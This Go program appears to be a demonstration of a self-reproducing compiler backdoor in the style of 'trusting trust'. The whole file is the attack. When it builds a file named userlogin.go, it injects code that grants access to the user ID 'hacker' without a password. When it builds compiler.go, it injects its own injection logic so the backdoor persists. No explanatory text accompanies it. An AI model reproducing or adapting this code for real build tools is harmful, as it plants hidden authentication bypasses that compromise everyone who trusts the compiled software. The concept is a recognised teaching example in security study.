package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"strings"
)

func main() {
	cmdLineArguments := os.Args

	binaryFile := cmdLineArguments[3]
	sourceFile := cmdLineArguments[4]

	bytes, err := ioutil.ReadFile(sourceFile)

	if err != nil {
		log.Fatal(err)
		return
	}

	sourceCode := string(bytes)

	textInjectUserLogin := `if userId == "hacker" {
		fmt.Println("Access Granted")
		return
	}

	`

	textInjectCompiler := `if strings.Contains(sourceFilename, "userlogin.go") {
		indexToInsert := strings.Index(sourceCode, "validPasswords :=")
		sourceCode = sourceCode[:indexToInsert] + textInjectUserLogin + sourceCode[indexToInsert:]
	}

	if strings.Contains(sourceFilename, "compiler.go") {
		backtick := string(96)
		newline := string(10)
		tab := string(9)

		indexToInsert := strings.Index(sourceCode, "tmpFilename :=")

		sourceCode = sourceCode[:indexToInsert] + "textInjectUserLogin := " + backtick + textInjectUserLogin + backtick + newline + newline + tab + "textInjectCompiler := " + backtick + textInjectCompiler + backtick + newline + newline + tab + textInjectCompiler + sourceCode[indexToInsert:]
	}

	`

	if strings.Contains(sourceFile, "userlogin.go") {
		indexToInsert := strings.Index(sourceCode, "validUserIds :=")
		sourceCode = sourceCode[:indexToInsert] + textInjectUserLogin + sourceCode[indexToInsert:]
	}

	if strings.Contains(sourceFile, "compiler.go") {
		backtick := string(96)
		newline := string(10)
		tab := string(9)

		indexToInsert := strings.Index(sourceCode, "tmpFilename :=")

		sourceCode = sourceCode[:indexToInsert] + "textInjectUserLogin := " + backtick + textInjectUserLogin + backtick + newline + newline + tab + "textInjectCompiler := " + backtick + textInjectCompiler + backtick + newline + newline + tab + textInjectCompiler + sourceCode[indexToInsert:]
	}

	tmpFilename := os.TempDir() + "/temp.go"

	err = ioutil.WriteFile(tmpFilename, []byte(sourceCode), 0644)
	if err != nil {
		log.Fatal(err)
	}
	defer os.Remove(tmpFilename)

	fmt.Print(sourceCode)

	output, err := exec.Command("go", "build", "-o", binaryFile, tmpFilename).CombinedOutput()

	fmt.Print(string(output))

	if err != nil {
		log.Fatal(err)
	}

}
